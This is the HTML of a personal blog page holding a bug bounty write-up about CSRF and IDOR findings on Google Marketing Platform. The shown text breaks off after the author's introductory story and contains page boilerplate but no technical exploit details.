@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en-US" class="no-js">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+	<link rel="pingback" href="https://apapedulimu.click/xmlrpc.php">
+	<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
+<title>2 CSRF 1 IDOR on Google Marketing Platform &#8211; Apapedulimu</title>
+<meta name='robots' content='max-image-preview:large' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel='dns-prefetch' href='//stats.wp.com' />
+<link rel='dns-prefetch' href='//v0.wordpress.com' />
+<link rel="alternate" type="application/rss+xml" title="Apapedulimu &raquo; Feed" href="https://apapedulimu.click/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Apapedulimu &raquo; Comments Feed" href="https://apapedulimu.click/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Apapedulimu &raquo; 2 CSRF 1 IDOR on Google Marketing Platform Comments Feed" href="https://apapedulimu.click/story-of-idor-on-google-product/feed/" />
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/apapedulimu.click\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<link rel='stylesheet' id='twentyfifteen-jetpack-css' href='https://apapedulimu.click/wp-content/plugins/jetpack/modules/theme-tools/compat/twentyfifteen.css?ver=14.2.1' media='all' />
+<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel='stylesheet' id='wp-block-library-css' href='https://apapedulimu.click/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1' media='all' />
+<style id='wp-block-library-theme-inline-css'>
+.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote:where(.has-text-align-right){border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote:where(.has-text-align-center){border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote:where(.is-style-plain){border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}
+</style>
+<link rel='stylesheet' id='mediaelement-css' href='https://apapedulimu.click/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17' media='all' />
+<link rel='stylesheet' id='wp-mediaelement-css' href='https://apapedulimu.click/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.7.1' media='all' />
+<style id='jetpack-sharing-buttons-style-inline-css'>
+.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
+</style>
+<style id='classic-theme-styles-inline-css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--dark-gray: #111;--wp--preset--color--light-gray: #f1f1f1;--wp--preset--color--yellow: #f4ca16;--wp--preset--color--dark-brown: #352712;--wp--preset--color--medium-pink: #e53b51;--wp--preset--color--light-pink: #ffe5d1;--wp--preset--color--dark-purple: #2e2256;--wp--preset--color--purple: #674970;--wp--preset--color--blue-gray: #22313f;--wp--preset--color--bright-blue: #55c3dc;--wp--preset--color--light-blue: #e9f2f9;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--gradient--dark-gray-gradient-gradient: linear-gradient(90deg, rgba(17,17,17,1) 0%, rgba(42,42,42,1) 100%);--wp--preset--gradient--light-gray-gradient: linear-gradient(90deg, rgba(241,241,241,1) 0%, rgba(215,215,215,1) 100%);--wp--preset--gradient--white-gradient: linear-gradient(90deg, rgba(255,255,255,1) 0%, rgba(230,230,230,1) 100%);--wp--preset--gradient--yellow-gradient: linear-gradient(90deg, rgba(244,202,22,1) 0%, rgba(205,168,10,1) 100%);--wp--preset--gradient--dark-brown-gradient: linear-gradient(90deg, rgba(53,39,18,1) 0%, rgba(91,67,31,1) 100%);--wp--preset--gradient--medium-pink-gradient: linear-gradient(90deg, rgba(229,59,81,1) 0%, rgba(209,28,51,1) 100%);--wp--preset--gradient--light-pink-gradient: linear-gradient(90deg, rgba(255,229,209,1) 0%, rgba(255,200,158,1) 100%);--wp--preset--gradient--dark-purple-gradient: linear-gradient(90deg, rgba(46,34,86,1) 0%, rgba(66,48,123,1) 100%);--wp--preset--gradient--purple-gradient: linear-gradient(90deg, rgba(103,73,112,1) 0%, rgba(131,93,143,1) 100%);--wp--preset--gradient--blue-gray-gradient: linear-gradient(90deg, rgba(34,49,63,1) 0%, rgba(52,75,96,1) 100%);--wp--preset--gradient--bright-blue-gradient: linear-gradient(90deg, rgba(85,195,220,1) 0%, rgba(43,180,211,1) 100%);--wp--preset--gradient--light-blue-gradient: linear-gradient(90deg, rgba(233,242,249,1) 0%, rgba(193,218,238,1) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='twentyfifteen-fonts-css' href='https://apapedulimu.click/wp-content/themes/twentyfifteen/assets/fonts/noto-sans-plus-noto-serif-plus-inconsolata.css?ver=20230328' media='all' />
+<link rel='stylesheet' id='genericons-css' href='https://apapedulimu.click/wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css?ver=3.1' media='all' />
+<link rel='stylesheet' id='twentyfifteen-style-css' href='https://apapedulimu.click/wp-content/themes/twentyfifteen/style.css?ver=20241112' media='all' />
+<style id='twentyfifteen-style-inline-css'>
+
+			.post-navigation .nav-previous { background-image: url(https://apapedulimu.click/wp-content/uploads/2020/07/google-bug-bounty-program.png); }
+			.post-navigation .nav-previous .post-title, .post-navigation .nav-previous a:hover .post-title, .post-navigation .nav-previous .meta-nav { color: #fff; }
+			.post-navigation .nav-previous a:before { background-color: rgba(0, 0, 0, 0.4); }
+		
+			.post-navigation .nav-next { background-image: url(https://apapedulimu.click/wp-content/uploads/2022/09/ciobulletin-apple-bug-bounty-program-825x499.jpeg); border-top: 0; }
+			.post-navigation .nav-next .post-title, .post-navigation .nav-next a:hover .post-title, .post-navigation .nav-next .meta-nav { color: #fff; }
+			.post-navigation .nav-next a:before { background-color: rgba(0, 0, 0, 0.4); }
+		
+</style>
+<link rel='stylesheet' id='twentyfifteen-block-style-css' href='https://apapedulimu.click/wp-content/themes/twentyfifteen/css/blocks.css?ver=20240715' media='all' />
+<link rel='stylesheet' id='enlighterjs-css' href='https://apapedulimu.click/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=zFT7OeexxixNfMD' media='all' />
+<script src="https://apapedulimu.click/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="https://apapedulimu.click/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script id="twentyfifteen-script-js-extra">
+var screenReaderText = {"expand":"<span class=\"screen-reader-text\">expand child menu<\/span>","collapse":"<span class=\"screen-reader-text\">collapse child menu<\/span>"};
+</script>
+<script src="https://apapedulimu.click/wp-content/themes/twentyfifteen/js/functions.js?ver=20221101" id="twentyfifteen-script-js" defer data-wp-strategy="defer"></script>
+<link rel="https://api.w.org/" href="https://apapedulimu.click/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://apapedulimu.click/wp-json/wp/v2/posts/399" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://apapedulimu.click/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.7.1" />
+<link rel="canonical" href="https://apapedulimu.click/story-of-idor-on-google-product/" />
+<link rel='shortlink' href='https://wp.me/paDCcI-6r' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://apapedulimu.click/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fapapedulimu.click%2Fstory-of-idor-on-google-product%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://apapedulimu.click/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fapapedulimu.click%2Fstory-of-idor-on-google-product%2F&#038;format=xml" />
+	<style>img#wpstats{display:none}</style>
+		
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article" />
+<meta property="og:title" content="2 CSRF 1 IDOR on Google Marketing Platform" />
+<meta property="og:url" content="https://apapedulimu.click/story-of-idor-on-google-product/" />
+<meta property="og:description" content="Found IDOR and CSRF Vulnerability on Google! In this article, I would like to share when I found a bug on Google Products. I hope you can get some useful information on this writeup, let me know yo…" />
+<meta property="article:published_time" content="2021-09-06T01:15:43+00:00" />
+<meta property="article:modified_time" content="2021-09-06T14:40:13+00:00" />
+<meta property="og:site_name" content="Apapedulimu" />
+<meta property="og:image" content="https://apapedulimu.click/wp-content/uploads/2020/07/google-bug-bounty-program.png" />
+<meta property="og:image:width" content="728" />
+<meta property="og:image:height" content="380" />
+<meta property="og:image:alt" content="" />
+<meta property="og:locale" content="en_US" />
+<meta name="twitter:text:title" content="2 CSRF 1 IDOR on Google Marketing Platform" />
+<meta name="twitter:image" content="https://apapedulimu.click/wp-content/uploads/2020/07/google-bug-bounty-program.png?w=640" />
+<meta name="twitter:card" content="summary_large_image" />
+
+<!-- End Jetpack Open Graph Tags -->
+<link rel="icon" href="https://apapedulimu.click/wp-content/uploads/2021/07/cropped-semar-1-32x32.jpg" sizes="32x32" />
+<link rel="icon" href="https://apapedulimu.click/wp-content/uploads/2021/07/cropped-semar-1-192x192.jpg" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://apapedulimu.click/wp-content/uploads/2021/07/cropped-semar-1-180x180.jpg" />
+<meta name="msapplication-TileImage" content="https://apapedulimu.click/wp-content/uploads/2021/07/cropped-semar-1-270x270.jpg" />
+</head>
+
+<body class="post-template-default single single-post postid-399 single-format-standard wp-embed-responsive">
+<div id="page" class="hfeed site">
+	<a class="skip-link screen-reader-text" href="#content">
+		Skip to content	</a>
+
+	<div id="sidebar" class="sidebar">
+		<header id="masthead" class="site-header">
+			<div class="site-branding">
+										<p class="site-title"><a href="https://apapedulimu.click/" rel="home">Apapedulimu</a></p>
+												<p class="site-description">Personal Blog &#8211; Portfolio</p>
+										<button class="secondary-toggle">Menu and widgets</button>
+			</div><!-- .site-branding -->
+		</header><!-- .site-header -->
+
+			<div id="secondary" class="secondary">
+
+					<nav id="site-navigation" class="main-navigation">
+				<div class="menu-main-container"><ul id="menu-main" class="nav-menu"><li id="menu-item-21" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21"><a href="https://apapedulimu.click">Home</a></li>
+<li id="menu-item-19" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-19"><a href="https://apapedulimu.click/contact-me/">Contact Me</a></li>
+<li id="menu-item-20" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20"><a href="https://apapedulimu.click/about-me/">About Me</a></li>
+<li id="menu-item-28" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-28"><a href="https://apapedulimu.click/hall-of-fame/">Hall Of Fame</a></li>
+<li id="menu-item-592" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-592"><a href="https://apapedulimu.click/publication/">Publication</a></li>
+</ul></div>			</nav><!-- .main-navigation -->
+		
+		
+					<div id="widget-area" class="widget-area" role="complementary">
+				<aside id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://apapedulimu.click/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit screen-reader-text" value="Search" />
+			</form></aside><aside id="custom_html-2" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Adsense 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6286056471796598"
+     data-ad-slot="6403910990"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></div></aside>			</div><!-- .widget-area -->
+		
+	</div><!-- .secondary -->
+
+	</div><!-- .sidebar -->
+
+	<div id="content" class="site-content">
+
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main">
+
+		<div class='code-block code-block-1' style='margin: 8px 0 8px auto; text-align: right; display: block; clear: both;'>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Adsense 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6286056471796598"
+     data-ad-slot="6403910990"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+<article id="post-399" class="post-399 post type-post status-publish format-standard has-post-thumbnail hentry category-bug-bounty tag-bug-bounty tag-csrf tag-google tag-idor">
+	
+		<div class="post-thumbnail">
+			<img width="728" height="380" src="https://apapedulimu.click/wp-content/uploads/2020/07/google-bug-bounty-program.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="https://apapedulimu.click/wp-content/uploads/2020/07/google-bug-bounty-program.png 728w, https://apapedulimu.click/wp-content/uploads/2020/07/google-bug-bounty-program-300x157.png 300w" sizes="(max-width: 728px) 100vw, 728px" />	</div><!-- .post-thumbnail -->
+
+	
+	<header class="entry-header">
+		<h1 class="entry-title">2 CSRF 1 IDOR on Google Marketing Platform</h1>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<h2>Found IDOR and CSRF Vulnerability on Google!</h2>
+<p>In this article, I would like to share when I found a bug on Google Products. I hope you can get some useful information on this writeup, let me know your feedback on this writeup on a comment section or on my twitter: <a href="https://twitter.com/LocalHost31337">Apapedulimu</a>!</p>
+<h3>Once Upon a Time</h3>
+<p>So, I&#8217;m on break to bug hunting since November 2019 because a lot of things and of course lack of energy because facing many duplicates. In February I decide to bug hunting on my favorite please: <strong>Google. </strong>Although I&#8217;m not pro enough to hunt at Google, at least Google has many assets to look at it. So, it&#8217;ll fun when hunting on them. And then I ping up my friends and invite him to hunt together on Google, and he says YES! It&#8217;s always fun when to hunt together with your friends because we can share what we dig and the information we gain and have a quick chat. So, when we can&#8217;t find any bug at least we can have fun~</p>
+<p>After that, I can&#8217;t find anything and run out of coffee. I decide to sleep and leave my friends to do the research. In the morning, he pings me up because looks like he found some interesting endpoint on<strong> marketingplatform.google.com</strong>. But, after taking a look it&#8217;s just working as intended.</p>
+<div class='code-block code-block-2' style='margin: 8px auto; text-align: center; display: block; clear: both;'>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Adsense 1 -->
+<ins class="adsbygoogle"
